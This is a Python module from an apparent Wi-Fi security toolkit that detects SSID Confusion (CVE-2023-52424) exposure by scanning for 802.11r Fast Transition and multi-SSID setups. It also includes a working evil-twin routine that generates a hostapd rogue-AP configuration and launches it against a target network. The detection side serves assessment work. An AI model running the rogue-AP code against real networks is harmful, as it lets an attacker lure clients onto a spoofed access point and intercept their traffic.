"""
SSID Confusion Detection - CVE-2023-52424

SSID Confusion vulnerability allows clients to connect to a different network 
than intended because the SSID is not included in the PMK derivation for 
networks using multi-band transitioning (802.11r/K/V).

The attack works because:
1. Networks with 802.11r (Fast BSS Transition) allow seamless roaming
2. The PMK is derived from the passphrase only, not the SSID
3. An attacker can create a rogue AP with different SSID but same BSSID/channel
4. Client may connect to rogue AP thinking it's the legitimate network

Detection:
1. Scan for networks with same BSSID but different SSIDs (rare but possible)
2. Detect 802.11r Fast Transition networks
3. Identify networks in transition mode (same band, different SSID)
4. Analyze 802.11k/v neighbor reports for confusion potential

CVE-2023-52424: SSID Confusion
CVE-2023-52425: SSID Confusion in 802.11r
"""

import asyncio
import shutil
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

import structlog

from urban_hs.modules.network import NmapScanner

logger = structlog.get_logger(__name__)


class SSIDConfusionType(Enum):
    """Types of SSID confusion scenarios."""
    SAME_BSSID_DIFF_SSID = "same_bssid_diff_ssid"      # Same BSSID, different SSIDs
    FT_ROGUE_AP = "ft_rogue_ap"                           # 802.11r Fast Transition rogue AP
    BAND_TRANSITION = "band_transition"                   # 2.4/5GHz transition confusion
    NEIGHBOR_REPORT_ATTACK = "neighbor_report_attack"    # 802.11k neighbor report manipulation
    MULTI_AP_SAME_PSK = "multi_ap_same_psk"              # Multiple APs with same PSK


@dataclass
class SSIDConfusionTarget:
    """Target network for SSID confusion analysis."""
    bssid: str
    ssid: str
    channel: int
    frequency: int  # 2412 for 2.4GHz, 5180 for 5GHz
    security_type: str  # WPA2, WPA3, etc.
    ft_enabled: bool = False  # 802.11r Fast Transition
    ft_over_ds: bool = False  # Fast Transition over DS
    mobility_domain: Optional[str] = None
    rssi: int = -100
    vendor: Optional[str] = None


@dataclass
class SSIDConfusionResult:
    """Result of SSID confusion analysis."""
    confusion_type: SSIDConfusionType
    vulnerable: bool
    targets_involved: List[SSIDConfusionTarget] = field(default_factory=list)
    description: str = ""
    risk_level: str = "low"  # critical, high, medium, low
    evidence: Dict[str, Any] = field(default_factory=dict)
    timestamp: datetime = field(default_factory=datetime.utcnow)


class SSIDConfusionDetector:
    """
    Detects SSID Confusion vulnerabilities (CVE-2023-52424/52425).

    Analyzes WiFi networks for SSID confusion potential:
    1. Detects 802.11r Fast BSS Transition (FT) networks
    2. Identifies networks with same PSK but different SSIDs
    3. Detects 802.11k/v neighbor report anomalies
    4. Analyzes multi-band transition configurations

    The vulnerability exists because:
    - In 802.11r FT, the PMK is derived from PSK only (no SSID)
    - Client can roam to AP with different SSID but same PMK
    - Rogue AP can spoof neighbor reports to redirect clients
    """

    def __init__(
        self,
        interface: str = "wlan0",
        scan_timeout: int = 30,
    ):
        self.interface = interface
        self.scan_timeout = scan_timeout
        self.nmap = NmapScanner()

    async def scan_networks(self, target_network: str = "192.168.1.0/24") -> List[SSIDConfusionTarget]:
        """Scan for WiFi networks and extract SSID confusion indicators."""
        # Use airodump-ng for detailed WiFi info
        from urban_hs.modules.wifi import WiFiScanner
        scanner = WiFiScanner(interface=self.interface)

        networks = await scanner.manager.scan(duration=self.scan_timeout)

        targets = []
        for network in networks:
            target = SSIDConfusionTarget(
                bssid=network.bssid,
                ssid=network.ssid or "<hidden>",
                channel=network.channel,
                frequency=network.frequency or self._channel_to_freq(network.channel),
                security_type=network.encryption,
                ft_enabled=self._is_ft_enabled(network),
                rssi=network.signal_dbm or -100,
                vendor=network.vendor,
            )
            targets.append(target)

        return targets

    def _channel_to_freq(self, channel: int) -> int:
        """Convert WiFi channel to frequency."""
        if 1 <= channel <= 14:
            return 2407 + (channel * 5)
        elif 36 <= channel <= 165:
            return 5000 + (channel * 5)
        return 0

    def _is_ft_enabled(self, network) -> bool:
        """Check if network has 802.11r Fast Transition enabled."""
        # Check flags for FT indicators
        flags = getattr(network, 'flags', [])
        flag_str = ','.join(flags).upper() if flags else ''

        ft_indicators = [
            'FT-PSK',
            'FT-EAP',
            '802.11R',
            'FAST TRANSITION',
            'FT',
        ]

        for indicator in ft_indicators:
            if indicator in flag_str:
                return True

        # Also check encryption field
        enc = getattr(network, 'encryption', '').upper()
        if 'FT' in enc or '802.11R' in enc:
            return True

        return False

    def analyze_confusion(self, targets: List[SSIDConfusionTarget]) -> List[SSIDConfusionResult]:
        """Analyze targets for SSID confusion vulnerabilities."""
        results = []

        # Group by BSSID
        bssid_groups: Dict[str, List[SSIDConfusionTarget]] = {}
        for target in targets:
            bssid_groups.setdefault(target.bssid, []).append(target)

        # 1. Same BSSID, different SSIDs
        for bssid, group in bssid_groups.items():
            if len(group) > 1:
                ssids = {t.ssid for t in group}
                if len(ssids) > 1:
                    # Same BSSID broadcasting multiple SSIDs
                    ft_count = sum(1 for t in group if t.ft_enabled)
                    risk = "high" if ft_count > 0 else "medium"

                    results.append(SSIDConfusionResult(
                        confusion_type=SSIDConfusionType.SAME_BSSID_DIFF_SSID,
                        vulnerable=True,
                        targets_involved=group,
                        description=f"BSSID {bssid} broadcasts {len(ssids)} different SSIDs: {', '.join(ssids)}. FT enabled: {ft_count}/{len(group)}",
                        risk_level=risk,
                        evidence={
                            "bssid": bssid,
                            "ssids": list(ssids),
                            "ft_enabled_count": ft_count,
                            "total_networks": len(group),
                        }
                    ))

        # 2. FT-enabled networks analysis
        ft_networks = [t for t in targets if t.ft_enabled]
        if ft_networks:
            # Group by mobility domain and PSK (inferred from same security)
            md_groups: Dict[str, List[SSIDConfusionTarget]] = {}
            for t in ft_networks:
                md = t.mobility_domain or f"channel_{t.channel}"
                md_groups.setdefault(md, []).append(t)

            for md, group in md_groups.items():
                if len(group) > 1:
                    ssids = {t.ssid for t in group}
                    if len(ssids) > 1:
                        # Multiple SSIDs in same mobility domain = potential confusion
                        results.append(SSIDConfusionResult(
                            confusion_type=SSIDConfusionType.FT_ROGUE_AP,
                            vulnerable=True,
                            targets_involved=group,
                            description=f"Mobility domain {md} has {len(group)} FT-enabled APs with {len(ssids)} different SSIDs",
                            risk_level="critical",
                            evidence={
                                "mobility_domain": md,
                                "ssids": list(ssids),
                                "ft_networks": len(group),
                            }
                        ))

        # 3. Band transition analysis (2.4GHz vs 5GHz same SSID/PSK)
        ssid_groups: Dict[str, List[SSIDConfusionTarget]] = {}
        for t in targets:
            ssid_groups.setdefault(t.ssid, []).append(t)

        for ssid, group in ssid_groups.items():
            if len(group) > 1:
                bands = set()
                for t in group:
                    if 2400 <= t.frequency <= 2500:
                        bands.add("2.4GHz")
                    elif 5000 <= t.frequency <= 5900:
                        bands.add("5GHz")

                if len(bands) > 1:
                    # Same SSID on multiple bands
                    ft_count = sum(1 for t in group if t.ft_enabled)
                    if ft_count > 0:
                        results.append(SSIDConfusionResult(
                            confusion_type=SSIDConfusionType.BAND_TRANSITION,
                            vulnerable=True,
                            targets_involved=group,
                            description=f"SSID '{ssid}' on multiple bands ({', '.join(bands)}) with FT enabled on {ft_count}/{len(group)} APs",
                            risk_level="high",
                            evidence={
                                "ssid": ssid,
                                "bands": list(bands),
                                "ft_enabled_count": ft_count,
                                "total_aps": len(group),
                            }
                        ))

        # 4. Same PSK inference (same security type on multiple APs of same vendor)
        if results:
            # Deduplicate results
            unique_results = []
            seen = set()
            for r in results:
                key = (r.confusion_type.value, tuple(sorted([t.bssid for t in r.targets_involved])))
                if key not in seen:
                    seen.add(key)
                    unique_results.append(r)
            return unique_results

        return results

    def get_risk_summary(self, results: List[SSIDConfusionResult]) -> Dict[str, Any]:
        """Get risk summary from analysis results."""
        if not results:
            return {
                "total_vulnerabilities": 0,
                "risk_level": "none",
                "summary": "No SSID confusion vulnerabilities detected",
            }

        critical = sum(1 for r in results if r.risk_level == "critical")
        high = sum(1 for r in results if r.risk_level == "high")
        medium = sum(1 for r in results if r.risk_level == "medium")
        low = sum(1 for r in results if r.risk_level == "low")

        overall = "critical" if critical > 0 else "high" if high > 0 else "medium" if medium > 0 else "low"

        return {
            "total_vulnerabilities": len(results),
            "risk_level": overall,
            "breakdown": {
                "critical": critical,
                "high": high,
                "medium": medium,
                "low": low,
            },
            "confusion_types": [r.confusion_type.value for r in results],
            "affected_networks": sum(len(r.targets_involved) for r in results),
            "summary": f"Found {len(results)} SSID confusion vulnerabilities. Overall risk: {overall}",
        }

    async def run_evil_twin_attack(
        self,
        target: SSIDConfusionTarget,
        rogue_ssid: str,
        passphrase: str,
        interface: Optional[str] = None,
        mobility_domain: Optional[str] = None,
        callback: Optional[Callable[[str], None]] = None,
    ) -> Dict[str, Any]:
        """
        Execute Evil Twin attack with 802.11r Fast Transition for SSID Confusion.

        This implements the CVE-2023-52424/52425 attack:
        1. Creates a rogue AP with hostapd configured for 802.11r FT
        2. Uses the target's mobility domain (or generates one)
        3. Sets up Fast Transition with the same PMK (derived from passphrase)
        3. Advertises the rogue SSID with same mobility domain as target
        4. Client may roam to rogue AP due to SSID not being in PMK derivation

        Requires:
        - hostapd with 802.11r support (CONFIG_IEEE80211R=y)
        - Wireless interface in AP mode (not monitor mode)
        - Root privileges
        - SAE/FT support in hostapd

        WARNING: This creates an actual rogue access point. Only use in
        authorized test environments.
        """
        if callback:
            callback(f"Starting Evil Twin attack on {target.ssid} ({target.bssid})")

        # Check for hostapd
        hostapd_path = shutil.which("hostapd")
        if not hostapd_path:
            return {
                "success": False,
                "error": "hostapd not found. Install hostapd with 802.11r support (CONFIG_IEEE80211R=y)",
            }

        if interface is None:
            interface = self.interface

        if mobility_domain is None:
            # Use target's mobility domain or generate one
            mobility_domain = target.mobility_domain or "a1b2"

        # Generate hostapd configuration
        config = self._generate_hostapd_config(
            interface=interface,
            ssid=rogue_ssid,
            passphrase=passphrase,
            channel=target.channel,
            mobility_domain=mobility_domain,
            target_bssid=target.bssid,
        )

        config_path = Path(f"/tmp/hostapd_evil_twin_{target.bssid.replace(':', '')}.conf")
        config_path.write_text(config)

        if callback:
            callback(f"Generated hostapd config: {config_path}")

        try:
            # Start hostapd
            if callback:
                callback("Starting rogue AP...")

            proc = await asyncio.create_subprocess_exec(
                "hostapd",
                str(config_path),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            # Wait for AP to start
            await asyncio.sleep(3)

            # Check if hostapd started successfully
            if proc.returncode is not None:
                stdout, stderr = await proc.communicate()
                return {
                    "success": False,
                    "error": f"hostapd failed to start: {stderr.decode()}",
                }

            if callback:
                callback(f"Rogue AP '{rogue_ssid}' started on channel {target.channel}")

            # Return the process handle for caller to manage
            return {
                "success": True,
                "message": "Evil Twin AP started with 802.11r Fast Transition",
                "process": proc,
                "config_path": str(config_path),
                "interface": interface,
                "ssid": rogue_ssid,
                "channel": target.channel,
                "mobility_domain": mobility_domain,
                "warning": "Process must be managed by caller - call stop_evil_twin_attack() to stop",
            }

        except Exception as e:
            logger.error("Evil Twin attack failed", error=str(e))
            return {
                "success": False,
                "error": str(e),
            }

    async def stop_evil_twin_attack(self, attack_handle: Dict[str, Any]) -> bool:
        """Stop a running Evil Twin attack."""
        proc = attack_handle.get("process")
        config_path = attack_handle.get("config_path")

        if proc and proc.returncode is None:
            proc.terminate()
            try:
                await asyncio.wait_for(proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()

        if config_path and Path(config_path).exists():
            try:
                Path(config_path).unlink()
            except Exception:
                pass

        return True

    def _generate_hostapd_config(
        self,
        interface: str,
        ssid: str,
        passphrase: str,
        channel: int,
        mobility_domain: str,
        target_bssid: Optional[str] = None,
    ) -> str:
        """Generate hostapd configuration for Evil Twin with 802.11r."""

        # Determine frequency band
        hw_mode = "g" if channel <= 14 else "a"

        config = f"""# Evil Twin hostapd config for SSID Confusion (CVE-2023-52424)
# Generated by Urban Hack Sentinel

interface={interface}
driver=nl80211
ctrl_interface=/var/run/hostapd
ctrl_interface_group=0

# SSID Configuration
ssid={ssid}
ssid2=00:00:00:00:00:00:00:00
utf8_ssid=1

# Radio Configuration
channel={channel}
hw_mode={hw_mode}
ieee80211n=1
ieee80211ac=1
ht_capab=[HT40+][SHORT-GI-20][SHORT-GI-40]
vht_capab=[SHORT-GI-80][RXLDPC][SHORT-GI-160][SU-BEAMFORMER]

# Security Configuration
auth_algs=1
wpa=2
wpa_passphrase={passphrase}
wpa_key_mgmt=WPA-PSK WPA-PSK-SHA256 FT-PSK
rsn_pairwise=CCMP

# 802.11r Fast BSS Transition (FT)
ieee80211r=1
ft_over_ds=1
ft_psk_generate_local=1
mobility_domain={mobility_domain}
nas_identifier=ET-{mobility_domain}
r0_key_lifetime=10000
r1_key_holder=00:00:00:00:00:00

# PMKSA caching
pmksa_caching=1

# WMM/QoS
wmm_enabled=1
uapsd_advertisement_enabled=1

# Additional settings
ignore_broadcast_ssid=0
disable_pmksa_caching=0
okc=1

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
"""
        return config

    async def run_full_assessment(
        self,
        target_area: str = "192.168.1.0/24",
        callback: Optional[Callable[[str], None]] = None,
    ) -> Dict[str, Any]:
        """Run complete SSID confusion assessment."""
        if callback:
            callback("Starting SSID Confusion assessment...")

        # Scan networks
        if callback:
            callback("Scanning WiFi networks for SSID confusion analysis...")

        targets = await self.scan_networks(target_area)

        if callback:
            callback(f"Found {len(targets)} networks. Analyzing for SSID confusion...")

        # Analyze
        results = self.analyze_confusion(targets)

        # Summary
        summary = self.get_risk_summary(results)

        if callback:
            callback(f"Assessment complete. Found {len(results)} SSID confusion issues.")

        return {
            "targets_scanned": len(targets),
            "targets": [
                {
                    "bssid": t.bssid,
                    "ssid": t.ssid,
                    "channel": t.channel,
                    "frequency": t.frequency,
                    "security": t.security_type,
                    "ft_enabled": t.ft_enabled,
                    "vendor": t.vendor,
                    "rssi": t.rssi,
                }
                for t in targets
            ],
            "vulnerabilities": [
                {
                    "type": r.confusion_type.value,
                    "risk": r.risk_level,
                    "description": r.description,
                    "targets": [{"bssid": t.bssid, "ssid": t.ssid} for t in r.targets_involved],
                    "evidence": r.evidence,
                }
                for r in results
            ],
            "summary": summary,
        }


# ============================================================
# Convenience Functions
# ============================================================

async def scan_ssid_confusion(
    target_area: str = "192.168.1.0/24",
    interface: str = "wlan0",
    scan_timeout: int = 30,
    callback: Optional[Callable[[str], None]] = None,
) -> Dict[str, Any]:
    """Convenience function for SSID confusion scan."""
    detector = SSIDConfusionDetector(interface=interface, scan_timeout=scan_timeout)
    return await detector.run_full_assessment(target_area, callback)


async def quick_ssid_confusion_check(
    interface: str = "wlan0",
    scan_timeout: int = 15,
) -> List[SSIDConfusionResult]:
    """Quick SSID confusion check."""
    detector = SSIDConfusionDetector(interface=interface, scan_timeout=scan_timeout)
    targets = await detector.scan_networks()
    return detector.analyze_confusion(targets)


# ============================================================
# Exports
# ============================================================

__all__ = [
    "SSIDConfusionType",
    "SSIDConfusionTarget",
    "SSIDConfusionResult",
    "SSIDConfusionDetector",
    "scan_ssid_confusion",
    "quick_ssid_confusion_check",
]